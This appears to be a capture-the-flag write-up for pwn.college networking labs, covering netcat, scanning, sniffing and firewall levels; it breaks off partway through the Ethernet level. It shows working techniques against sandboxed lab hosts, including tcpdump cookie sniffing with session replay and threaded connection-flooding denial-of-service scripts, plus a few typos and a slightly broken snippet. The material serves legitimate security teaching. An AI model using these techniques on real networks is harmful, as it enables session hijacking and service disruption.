---
custom_edit_url: null
sidebar_position: 2
---

## Connect

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import os
import socket

import psutil
from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class ServerHost(Host):
    def entrypoint(self):
        server_socket = socket.socket()
        server_socket.bind(("0.0.0.0", 31337))
        server_socket.listen()
        while True:
            try:
                connection, _ = server_socket.accept()
                connection.sendall(flag.encode())
                connection.close()
            except ConnectionError:
                continue

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
server_host = ServerHost("ip-10-0-0-2")
network = Network(hosts={user_host: "10.0.0.1", server_host: "10.0.0.2"}, subnet="10.0.0.0/24")
network.run()

user_host.interactive(environ=parent_process.environ())
```

In this challegne, we have to connect to `10.0.0.2` on port `31337`.

```
hacker@intercepting-communication~connect:/$ /challenge/run 
root@ip-10-0-0-1:/#
```

```
root@ip-10-0-0-1:/# nc 10.0.0.2 31337
pwn.college{wbLEvztIH-MlyXZbTzR3-bhhAwh.dlTNzMDL4ITM0EzW}
```

&nbsp;

## Send

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import os
import socket

import psutil
from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class ServerHost(Host):
    def entrypoint(self):
        server_socket = socket.socket()
        server_socket.bind(("0.0.0.0", 31337))
        server_socket.listen()
        while True:
            try:
                connection, _ = server_socket.accept()
                while True:
                    client_message = connection.recv(1024).decode()
                    if not client_message:
                        break
                    if client_message == "Hello, World!\n":
                        connection.sendall(flag.encode())
                        break
                connection.close()
            except ConnectionError:
                continue

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
server_host = ServerHost("ip-10-0-0-2")
network = Network(hosts={user_host: "10.0.0.1", server_host: "10.0.0.2"}, subnet="10.0.0.0/24")
network.run()

user_host.interactive(environ=parent_process.environ())
```

This time we have to send a message containing `"Hello, World!""` to the remote host `10.0.0.2` on port `31337`.

```
root@ip-10-0-0-1:/# nc 10.0.0.2 31337
Hello, World!
pwn.college{0Hb11t9ijpcF9e3tDdE_3W2fDWk.QX1IDM2EDL4ITM0EzW}
```

&nbsp;

## Shutdown

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import os
import socket

import psutil
from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class ServerHost(Host):
    def entrypoint(self):
        server_socket = socket.socket()
        server_socket.bind(("0.0.0.0", 31337))
        server_socket.listen()
        while True:
            try:
                connection, _ = server_socket.accept()
                while True:
                    if not connection.recv(1):
                        connection.sendall(flag.encode())
                        break
                connection.close()
            except ConnectionError:
                continue

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
server_host = ServerHost("ip-10-0-0-2")
network = Network(hosts={user_host: "10.0.0.1", server_host: "10.0.0.2"}, subnet="10.0.0.0/24")
network.run()

user_host.interactive(environ=parent_process.environ())
```

We can use the `-N` option in `nc` so that it shuts down on `CTRL-D`.

```
hacker@intercepting-communication~shutdown:/$ /challenge/run 
root@ip-10-0-0-1:/# 
```

```
root@ip-10-0-0-1:/# nc -N 10.0.0.2 31337
pwn.college{M0ZqQvNQkxl9FGLlvmqyp4DYcoE.QX2IDM2EDL4ITM0EzW}
```

&nbsp;

## Listen

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import os
import socket
import time

import psutil
from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class ClientHost(Host):
    def entrypoint(self):
        while True:
            time.sleep(1)
            try:
                client_socket = socket.socket()
                client_socket.connect(("10.0.0.1", 31337))
                client_socket.sendall(flag.encode())
                client_socket.close()
            except (ConnectionError, TimeoutError):
                continue

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
server_host = ClientHost("ip-10-0-0-2")
network = Network(hosts={user_host: "10.0.0.1", server_host: "10.0.0.2"}, subnet="10.0.0.0/24")
network.run()

user_host.interactive(environ=parent_process.environ())
```

This time we have to listn for a connection on port `31337`.

```
hacker@intercepting-communication~listen:/$ /challenge/run 
root@ip-10-0-0-1:/#
```

```
root@ip-10-0-0-1:/# nc -l 31337
pwn.college{YEg8RQOuKAnFvEr1BPhIXGL7y1c.dBjNzMDL4ITM0EzW}
```

&nbsp;

## Scan 1

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import os
import random
import socket

import psutil
from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class ServerHost(Host):
    def entrypoint(self):
        server_socket = socket.socket()
        server_socket.bind(("0.0.0.0", 31337))
        server_socket.listen()
        while True:
            try:
                connection, _ = server_socket.accept()
                connection.sendall(flag.encode())
                connection.close()
            except ConnectionError:
                continue

unknown_ip = f"10.0.0.{random.randint(10, 254)}"

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
server_host = ServerHost("ip-10-0-0-?")
network = Network(hosts={user_host: "10.0.0.1", server_host: unknown_ip}, subnet="10.0.0.0/24")
network.run()

user_host.interactive(environ=parent_process.environ())
```

In this challenge, we have to find the host which is up in our subnet, and then connect to it on port `31337`.

```
root@ip-10-0-0-1:/# for i in $(seq 1 255); do ping -c 1 -W 1 10.0.0.$i > /dev/null 2>&1 && echo "10.0.0.$i is up"; done; 
-bash: child setpgid (12 to 3746): Operation not permitted
10.0.0.1 is up
10.0.0.73 is up
root@ip-10-0-0-1:/# nc 10.0.0.73 31337
```

The `-c` option specifies the number of `ECHO_REQUEST` packets we send, and the `-W` option specifies the number of seconds we wait for a response before we timout and move on to the next host.

As we can see, the host `10.0.0.73` is up.

```
root@ip-10-0-0-1:/# nc 10.0.0.73 31337
pwn.college{w9cEDV2HoE3YNa5SUNShEMZAcfA.dFjNzMDL4ITM0EzW}
```

&nbsp;

## Scan 2

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import os
import random
import socket

import psutil
from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class ServerHost(Host):
    def entrypoint(self):
        server_socket = socket.socket()
        server_socket.bind(("0.0.0.0", 31337))
        server_socket.listen()
        while True:
            try:
                connection, _ = server_socket.accept()
                connection.sendall(flag.encode())
                connection.close()
            except ConnectionError:
                continue

unknown_ip = f"10.0.{random.randint(1, 255)}.{random.randint(1, 254)}"

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
server_host = ServerHost("ip-10-0-?-?")
network = Network(hosts={user_host: "10.0.0.1", server_host: unknown_ip}, subnet="10.0.0.0/16")
network.run()

user_host.interactive(environ=parent_process.environ())
```

This time we have to scan the `/16` subnet using NMAP.

```
root@ip-10-0-0-1:/# nmap -p 31337 10.0.0.0/16 --open -T5 --min-hostgroup 256 --max-hostgroup 1024
Warning: You specified a highly aggressive --min-hostgroup.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-15 15:43 UTC
Nmap scan report for 10.0.220.241
Host is up (0.000055s latency).

PORT      STATE SERVICE
31337/tcp open  Elite
MAC Address: F6:1C:58:5C:33:86 (Unknown)

Nmap done: 65536 IP addresses (2 hosts up) scanned in 2663.68 seconds
```

The options used are as follows:
- `-p`: Scan only specified port
- `--open`: Show only hosts with ports
- `-T5`: Use the most aggressive timing (fastest scan)
- `--min-hostgroup`: Specify the minimum number of hosts to be scanned concurrently
- `--max-hostgroup`: Specify the maximum number of hosts to be scanned concurrently

```
root@ip-10-0-0-1:/# nc 10.0.220.241 31337
pwn.college{gpJ1hkttpIQi_Dr58v9ReQoWsFD.dJjNzMDL4ITM0EzW}
```

&nbsp;

## Monitor 1

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import os
import socket
import time

import psutil
from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class ClientHost(Host):
    def entrypoint(self):
        while True:
            time.sleep(1)
            try:
                client_socket = socket.socket()
                client_socket.connect(("10.0.0.2", 31337))
                client_socket.sendall(flag.encode())
                client_socket.close()
            except (ConnectionError, TimeoutError):
                continue

class ServerHost(Host):
    def entrypoint(self):
        server_socket = socket.socket()
        server_socket.bind(("0.0.0.0", 31337))
        server_socket.listen()
        while True:
            try:
                connection, _ = server_socket.accept()
                connection.recv(1024)
                connection.close()
            except ConnectionError:
                continue

user_host = ClientHost("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
server_host = ServerHost("ip-10-0-0-2")
network = Network(hosts={user_host: "10.0.0.1", server_host: "10.0.0.2"}, subnet="10.0.0.0/24")
network.run()

user_host.interactive(environ=parent_process.environ())
```

For this challenge, we have to observe network traffic using Wireshark, and find the flag.

![image](https://github.com/user-attachments/assets/6ae68ef1-a095-4b66-972c-8cdc3ef42193)

```
pwn.college{w5xqRA9L9VqC5wgnj0y2NJf5Zd5.dNjNzMDL4ITM0EzW}
```

&nbsp;

## Monitor 2

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import os
import socket
import time

import psutil
from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class ClientHost(Host):
    def entrypoint(self):
        while True:
            time.sleep(1)
            try:
                client_socket = socket.socket()
                client_socket.connect(("10.0.0.2", 31337))
                for c in flag:
                    client_socket.sendall(c.encode())
                    time.sleep(1)
                client_socket.close()
            except (ConnectionError, TimeoutError):
                continue

class ServerHost(Host):
    def entrypoint(self):
        server_socket = socket.socket()
        server_socket.bind(("0.0.0.0", 31337))
        server_socket.listen()
        while True:
            try:
                connection, _ = server_socket.accept()
                while connection.recv(1):
                    pass
                connection.close()
            except ConnectionError:
                continue

user_host = ClientHost("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
server_host = ServerHost("ip-10-0-0-2")
network = Network(hosts={user_host: "10.0.0.1", server_host: "10.0.0.2"}, subnet="10.0.0.0/24")
network.run()

user_host.interactive(environ=parent_process.environ())
```

We can use a simple Python script to capture the flag byte by byte and craft the complete flag.

```py
In [1]: from scapy.all import sniff, Raw
   ...: 
   ...: buffer = b""
   ...: 
   ...: def handle_packet(packet):
   ...:     global buffer
   ...:     if packet.haslayer(Raw):
   ...:         buffer += bytes(packet[Raw])
   ...:         if b'pwn.college{' in buffer and b'}' in buffer:
   ...:             start = buffer.find(b'pwn.college{')
   ...:             end = buffer.find(b'}', start)
   ...:             if end != -1:
   ...:                 flag = buffer[start:end+1]
   ...:                 print(f"\nFlag captured: {flag.decode(errors='ignore')}")
   ...:                 exit(0)  # stop sniffing
   ...: 
   ...: sniff(filter="tcp dst port 31337", prn=handle_packet)
   ...: 

Flag captured: pwn.college{I4fIyKwkQexXwA6EYgWabI6ocRG.dRjNzMDL4ITM0EzW}
```

&nbsp;

## Sniffing Cookies

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import requests
import random
import psutil
import string
import flask
import time
import sys
import os

from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())
admin_pw = "".join(random.sample(string.ascii_letters*10, 8))

def ensure_new_file_fd(path, flags):
    return os.open(path, os.O_CREAT|os.O_EXCL|os.O_WRONLY)

class ClientHost(Host):
    def entrypoint(self):
        sys.stderr = open("/tmp/client-stderr", "w", opener=ensure_new_file_fd)

        time.sleep(2)
        s = requests.Session()
        assert s.post("http://10.0.0.2/login", data={"username":"admin", "password":admin_pw}).status_code == 200
        while True:
            try:
                s.get("http://10.0.0.2/ping")
                time.sleep(1)
            except (OSError, ConnectionError, TimeoutError, RequestException):
                continue

class ServerHost(Host):
    def entrypoint(self):
        sys.stderr = open("/tmp/server-output", "w", opener=ensure_new_file_fd)
        sys.stdout = sys.stderr

        app = flask.Flask("server")

        @app.route("/login", methods=["POST"])
        def login():
            username = flask.request.form.get("username")
            password = flask.request.form.get("password")
            if username == "admin" and password == admin_pw:
                flask.session["user"] = "admin"
                return "OK"
            flask.abort(403, "NOPE")

        @app.route("/ping", methods=["GET"])
        def ping():
            return "pong"

        @app.route("/flag", methods=["GET"])
        def get_flag():
            if flask.session.get("user", None) != "admin":
                flask.abort(403, "NOPE")
            return flag

        app.secret_key = os.urandom(8)
        app.run("0.0.0.0", 80)

client_host = ClientHost("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
server_host = ServerHost("ip-10-0-0-2")
network = Network(hosts={ client_host: "10.0.0.1", server_host: "10.0.0.2" }, subnet="10.0.0.0/24")
network.run()

client_host.interactive(environ=parent_process.environ())
```

The `admin` logs in on `10.0.0.1` and gets a session cookie.
This cookie is then used to access the flag from the `/flag` endpoint on `10.0.0.2`.

Let's sniff the cookie.

```
root@ip-10-0-0-1:/# tcpdump -i any -A 'tcp port 80' | grep --color=always -E 'Cookie:|Set-Cookie:'
-bash: child setpgid (18 to 2439): Operation not permitted
tcpdump: WARNING: any: That device doesn't support promiscuous mode
(Promiscuous mode not supported on the "any" device)
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.aFBJpg.Y9xBw6F8lRXYZomiDVkLwwHHp6k

# --- snip ---
```

Now we can use teh cookie to get the flag from `http://10.0.0.2/flag`.

```py
In [1]: import requests
   ...: 
   ...: cookies = {
   ...:     "session": "eyJ1c2VyIjoiYWRtaW4ifQ.aFBJpg.Y9xBw6F8lRXYZomiDVkLwwHHp6k"
   ...: }
   ...: 
   ...: responnse = requests.get("http://10.0.0.2/flag", cookies = cookies)
   ...: print(response.text)
   ...: 
pwn.college{s_X0-uEuI4QDPvCeidQDJnjs1ke.QXxQDM2EDL4ITM0EzW}
```

&nbsp;

## Network Configuration

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import os
import socket
import time

import psutil
from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class ClientHost(Host):
    def entrypoint(self):
        while True:
            time.sleep(1)
            try:
                client_socket = socket.socket()
                client_socket.connect(("10.0.0.3", 31337))
                client_socket.sendall(flag.encode())
                client_socket.close()
            except (OSError, ConnectionError, TimeoutError):
                continue

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
client_host = ClientHost("ip-10-0-0-2")
network = Network(hosts={user_host: "10.0.0.1", client_host: "10.0.0.2"}, subnet="10.0.0.0/24")
network.run()

user_host.interactive(environ=parent_process.environ())
```

In this level, the host at `10.0.0.2` is communicating with the host at `10.0.0.3`.
We can essentially become `10.0.0.3` so that we now receive those packets.

```
root@ip-10-0-0-1:/# ip address add 10.0.0.3/16 dev eth0
```

We have added the address on our `eth0` interface.

Now when we receive an ARP `who-has` request asking for `10.0.0.3`, we can send a `is-at` reply with our MAC address.

```
root@ip-10-0-0-1:/# nc -l 31337
pwn.college{Ij1Vds7KoGcIewEjDEEof1oBvmi.dVjNzMDL4ITM0EzW}
```

&nbsp;

## Firewall 1

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import multiprocessing
import os
import socket
import socketserver
import time

import psutil
from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class ServerHost(Host):
    def entrypoint(self):
        last_connected_time = multiprocessing.Value("d", time.time())

        def watchdog():
            while True:
                with last_connected_time.get_lock():
                    if time.time() - last_connected_time.value > 2:
                        print(flag, flush=True)
                        break
                time.sleep(1)

        watchdog_process = multiprocessing.Process(target=watchdog)
        watchdog_process.daemon = True
        watchdog_process.start()

        class ForkingTCPHandler(socketserver.BaseRequestHandler):
            def handle(self):
                with last_connected_time.get_lock():
                    last_connected_time.value = time.time()
                self.request.recv(1024)

        with socketserver.ForkingTCPServer(("0.0.0.0", 31337), ForkingTCPHandler) as server:
            server.serve_forever()

class ClientHost(Host):
    def entrypoint(self):
        while True:
            time.sleep(1)
            try:
                with socket.create_connection(("10.0.0.1", 31337)) as client_socket:
                    client_socket.sendall(b"Hello, World!\n")
            except (OSError, ConnectionError, TimeoutError):
                continue

user_host = ServerHost("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
client_host = ClientHost("ip-10-0-0-2")
network = Network(hosts={user_host: "10.0.0.1", client_host: "10.0.0.2"}, subnet="10.0.0.0/24")
network.run()

user_host.interactive(environ=parent_process.environ())
```

This time we have to block traffic on port `31337`.

We can do that using the `iptabes` command.

```
root@ip-10-0-0-1:/# iptables -A INPUT -p tcp --dport 31337 -j DROP
root@ip-10-0-0-1:/# pwn.college{4gzO4ofTkOcR06polLF21wrKAru.QX4QDM2EDL4ITM0EzW}
```

&nbsp;

## Firewall 2

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import multiprocessing
import os
import socket
import socketserver
import time

import psutil
from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class ServerHost(Host):
    def entrypoint(self):
        manager = multiprocessing.Manager()
        last_connected_times = manager.dict()

        def watchdog():
            while True:
                time.sleep(1)
                current_time = time.time()
                if current_time - last_connected_times.get("10.0.0.2", current_time) > 2:
                    continue
                if current_time - last_connected_times.get("10.0.0.3", current_time) < 2:
                    continue
                print(flag, flush=True)
                break

        watchdog_process = multiprocessing.Process(target=watchdog)
        watchdog_process.daemon = True
        watchdog_process.start()

        class ForkingTCPHandler(socketserver.BaseRequestHandler):
            def handle(self):
                client_ip, _ = self.client_address
                last_connected_times[client_ip] = time.time()
                self.request.recv(1024)

        with socketserver.ForkingTCPServer(("0.0.0.0", 31337), ForkingTCPHandler) as server:
            server.serve_forever()

class ClientHost(Host):
    def entrypoint(self):
        while True:
            time.sleep(1)
            try:
                with socket.create_connection(("10.0.0.1", 31337)) as client_socket:
                    client_socket.sendall(b"Hello, World!\n")
            except (OSError, ConnectionError, TimeoutError):
                continue

user_host = ServerHost("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
client_host_1 = ClientHost("ip-10-0-0-2")
client_host_2 = ClientHost("ip-10-0-0-3")
network = Network(hosts={user_host: "10.0.0.1", client_host_1: "10.0.0.2", client_host_2: "10.0.0.3"},
                  subnet="10.0.0.0/24")
network.run()

user_host.interactive(environ=parent_process.environ())
```

In this challenge, we have to only block traffic from `10.0.0.3` on `31337`.

```
root@ip-10-0-0-1:/# iptables -A INPUT -p tcp -s 10.0.0.3 --dport 31337 -j DROP
root@ip-10-0-0-1:/# pwn.college{k1UUolaE-mtHzfAEzyJtlXZsqNT.QX5QDM2EDL4ITM0EzW}
```

&nbsp;

## Firewall 3

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import os
import random
import socket
import subprocess

import psutil
from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

def drop_packets(dport):
    subprocess.run(["/usr/sbin/iptables",
                    "-A", "OUTPUT",
                    "-p", "tcp",
                    "--dport", str(dport),
                    "-j", "DROP"],
                   stdin=subprocess.DEVNULL,
                   capture_output=True,
                   check=True)

class ServerHost(Host):
    def entrypoint(self):
        server_socket = socket.socket()
        server_socket.bind(("0.0.0.0", 31337))
        server_socket.listen()
        while True:
            try:
                connection, _ = server_socket.accept()
                connection.sendall(flag.encode())
                connection.close()
            except ConnectionError:
                continue

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
server_host = ServerHost("ip-10-0-0-2")
network = Network(hosts={user_host: "10.0.0.1", server_host: "10.0.0.2"}, subnet="10.0.0.0/24")
network.run()

user_host.exec(lambda: drop_packets(31337))

user_host.interactive(environ=parent_process.environ())
```

Thios time we have to open up port `31337` for outbound connections.

```
root@ip-10-0-0-1:/# iptables -I OUTPUT -p tcp -d 10.0.0.2 --dport 31337 -j ACCEPT
```

We can verify that our rule has been created.

```
root@ip-10-0-0-1:/# iptables -L OUTPUT -v -n --line-numbers
Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
1        0     0 ACCEPT     tcp  --  *      *       0.0.0.0/0            10.0.0.2             tcp dpt:31337
2        0     0 DROP       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:31337
```

```
root@ip-10-0-0-1:/# nc 10.0.0.2 31337
pwn.college{8T7GpLSG0UQsqNItYdCt1AztxCN.QXwUDM2EDL4ITM0EzW}
```

&nbsp;

## Denial of Service 1

> The client at `10.0.0.3` is communicating with the server at `10.0.0.2` on port `31337`. Deny this service.

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import os
import socket
import time

import psutil
from dojjail import Host, Network
from dojjail.capabilities import limit_capabilities

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class ServerHost(Host):
    def entrypoint(self):
        server_socket = socket.socket()
        server_socket.bind(("0.0.0.0", 31337))
        server_socket.listen(1)
        while True:
            try:
                connection, _ = server_socket.accept()
                connection.recv(1024)
                connection.close()
            except ConnectionError:
                continue

class ClientHost(Host):
    def entrypoint(self):
        while True:
            time.sleep(1)
            try:
                with socket.create_connection(("10.0.0.2", 31337), timeout=1) as client_socket:
                    client_socket.sendall(b"Hello, World!\n")
            except (TimeoutError, socket.timeout):
                print(flag, flush=True)
                break
            except (OSError, ConnectionError):
                continue

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
server_host = ServerHost("ip-10-0-0-2")
client_host = ClientHost("ip-10-0-0-3")
network = Network(hosts={user_host: "10.0.0.1", server_host: "10.0.0.2", client_host: "10.0.0.3"},
                  subnet="10.0.0.0/24")
network.run()

user_host.interactive(preexec_fn=lambda: limit_capabilities(0), environ=parent_process.environ())
```

Client keeps trying to connect to `10.0.0.2:31337`. 
If the server stops responding (e.g., due to DoS), the client hits a timeout.
On timeout, the client prints the flag and breaks out of the loop.

We have to bombard the server so that it does not respond to the client, and we get a flag.

```py title="~/script.py" showLineNumbers
import socket

s = socket.create_connection(("10.0.0.2", 31337))
input("Holding connections open...\n")
```

```py
root@ip-10-0-0-1:~# python ~/script.py
Holding connections open...
pwn.college{YEX2Ry1o2FmWPH-DALp2yFdHjNO.QX3UDM2EDL4ITM0EzW}
```

&nbsp;

## Denial of Service 2

> The client at `10.0.0.3` is communicating with the server at `10.0.0.2` on port `31337`. Deny this service.
>
> This time the server forks a new process for each client connection.

### Source code
```py title="/challenge/run showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import os
import socket
import socketserver
import time

import psutil
from dojjail import Host, Network
from dojjail.capabilities import limit_capabilities

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class ServerHost(Host):
    def entrypoint(self):
        class ForkingTCPHandler(socketserver.BaseRequestHandler):
            def handle(self):
                self.request.recv(1024)

        with socketserver.ForkingTCPServer(("0.0.0.0", 31337), ForkingTCPHandler) as server:
            server.serve_forever()

class ClientHost(Host):
    def entrypoint(self):
        while True:
            try:
                with socket.create_connection(("10.0.0.2", 31337), timeout=1) as client_socket:
                    client_socket.sendall(b"Hello, World!\n")
                time.sleep(1)
            except (TimeoutError, socket.timeout):
                print(flag, flush=True)
                break
            except (OSError, ConnectionError) as e:
                print(type(e), e, flush=True)
                continue

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
server_host = ServerHost("ip-10-0-0-2")
client_host = ClientHost("ip-10-0-0-3")
network = Network(hosts={user_host: "10.0.0.1", server_host: "10.0.0.2", client_host: "10.0.0.3"},
                  subnet="10.0.0.0/24")
network.run()

user_host.interactive(preexec_fn=lambda: limit_capabilities(0), environ=parent_process.environ())
```

This time the server forks and spawns a new process per connection. Thus, we cannot do Dos by just holding a simgle connection open anymore.

We will have to send multiple connections to the server so that it does not respond to the client. This will cause the client to time out and print the flag.

Let's start with `100` connections.

```py title="~/script.py" showLineNumbers
import socket
import time

target = ("10.0.0.2", 31337)
sockets = []

for i in range(100):
    try:
        s = socket.create_connection(target, timeout=1)
        sockets.append(s)
        print(f"Held {i} connections")
        time.sleep(0.05)
    except Exception as e:
        print("Error:", e)
        break

input("Holding connections open...\n")
```

```py
root@ip-10-0-0-1:/# python ~/script.py
Held 0 connections
Held 1 connections

# --- snip ---

Held 44 connections
Held 45 connections
Error: timed out
Holding connections open...
pwn.college{UYk-vC_7sk20Ga1gEsbb-_0T0BP.QX4UDM2EDL4ITM0EzW}
```

&nbsp;

## Denial of Service 3

> The client at `10.0.0.3` is communicating with the server at `10.0.0.2` on port `31337`. Deny this service.
>
> This time the server forks a new process for each client connection, and limits each session to 1 second.

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import os
import socket
import socketserver
import time

import psutil
from dojjail import Host, Network
from dojjail.capabilities import limit_capabilities

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class ServerHost(Host):
    def entrypoint(self):
        class ForkingTCPHandler(socketserver.BaseRequestHandler):
            def handle(self):
                self.request.settimeout(1)
                try:
                    self.request.recv(1024)
                except (TimeoutError, socket.timeout):
                    return

        with socketserver.ForkingTCPServer(("0.0.0.0", 31337), ForkingTCPHandler) as server:
            server.serve_forever()

class ClientHost(Host):
    def entrypoint(self):
        while True:
            try:
                with socket.create_connection(("10.0.0.2", 31337), timeout=60) as client_socket:
                    client_socket.sendall(b"Hello, World!\n")
                time.sleep(1)
            except (TimeoutError, socket.timeout) as e:
                print(flag, flush=True)
                break
            except (OSError, ConnectionError):
                continue

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
server_host = ServerHost("ip-10-0-0-2")
client_host = ClientHost("ip-10-0-0-3")
network = Network(hosts={user_host: "10.0.0.1", server_host: "10.0.0.2", client_host: "10.0.0.3"},
                  subnet="10.0.0.0/24")
network.run()

user_host.interactive(preexec_fn=lambda: limit_capabilities(0), environ=parent_process.environ())
```

This time we have to do multithreading in order to 

```py title="~/script.py" showLineNumbers
import socket
import time
import threading

def spam():
    while True:
        try:
            s = socket.create_connection(("10.0.0.2", 31337), timeout=1)
            time.sleep(1)  
            s.close()
        except Exception:
            pass
        time.sleep(0.01) 

for _ in range(500):  
    threading.Thread(target=spam, daemon=True).start()

# Keep main thread alive
while True:
    time.sleep(1)
```

```
root@ip-10-0-0-1:/# python ~/script.py 
pwn.college{orOZm1YzShPJNpNGcX6vl2sDgCv.QX5UDM2EDL4ITM0EzW}
```

&nbsp;

## Ethernet

> Manually send an Ethernet packet. The packet should have `Ether type=0xFFFF`. The packet should be sent to the remote host at `10.0.0.2`.

### Source code
```py title="/challenge/run" showLineNumbers
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import os

import psutil
import scapy.all as scapy
from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class RawPacketHost(Host):
    def entrypoint(self):
        scapy.conf.ifaces.reload()
        scapy.sniff(prn=self.handle_packet, iface="eth0")

    def handle_packet(self, packet):
        if "Ether" not in packet:
            return
        if packet["Ether"].type == 0xFFFF:
            print(flag, flush=True)

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
raw_packet_host = RawPacketHost("ip-10-0-0-2")
network = Network(hosts={user_host: "10.0.0.1", raw_packet_host: "10.0.0.2"}, subnet="10.0.0.0/24")
network.run()

user_host.interactive(environ=parent_process.environ())
```

In this challenge, we have to Ethernet packet with `type=0xFFFF` to the remote host `10.0.0.2`.

```
hacker@intercepting-communication~ethernet:/$ /challenge/run
root@ip-10-0-0-1:/# 
```

```
root@ip-10-0-0-1:/# scapy
INFO: Couldn't write cache into /home/hacker/.cache/scapy/services: [Errno 13] Permission denied: '/home/hacker/.cache/scapy/services'
INFO: Couldn't write cache into /home/hacker/.cache/scapy/ethertypes: [Errno 13] Permission denied: '/home/hacker/.cache/scapy/ethertypes'
INFO: Couldn't write cache into /home/hacker/.cache/scapy/manufdb: [Errno 13] Permission denied: '/home/hacker/.cache/scapy/manufdb'
INFO: Can't import PyX. Won't be able to use psdump() or pdfdump().
                                      
                     aSPY//YASa       
             apyyyyCY//////////YCa       |
            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy
 ayp ayyyyyyySCP//Pp           syY//C    | Version 2.6.1
 AYAsAYYYYYYYY///Ps              cY//S   |
         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy
         SPPPP///a          pP///AC//Y   |
              A//A            cyP////C   | Have fun!
              p///Ac            sC///a   |
              P////YCpc           A//A   | Craft packets before they craft
       scccccp///pSP///p          p//Y   | you.
      sY/////////y  caa           S//P   |                      -- Socrate
       cayCyayP//Ya              pY/Ya   |
        sY/PsY////YCc          aC//Yp 
         sc  sccaCY//PCypaapyCP//YSs  
                  spCPY//////YPSps    
                       ccaacs         
                                      
>>>
```

```py
>>> Ether().display()
###[ Ethernet ]###
  dst       = None
  src       = 00:00:00:00:00:00
  type      = 0x9000
```

We have to change the default fields.
But before we do that, we will have to find the MAC address of `10.0.0.1`.

```
root@ip-10-0-0-1:/# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.0.1  netmask 255.255.255.0  broadcast 0.0.0.0
        inet6 fe80::48ae:54ff:feb8:cb8a  prefixlen 64  scopeid 0x20<link>
        ether 4a:ae:54:b8:cb:8a  txqueuelen 1000  (Ethernet)
        RX packets 28  bytes 2276 (2.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
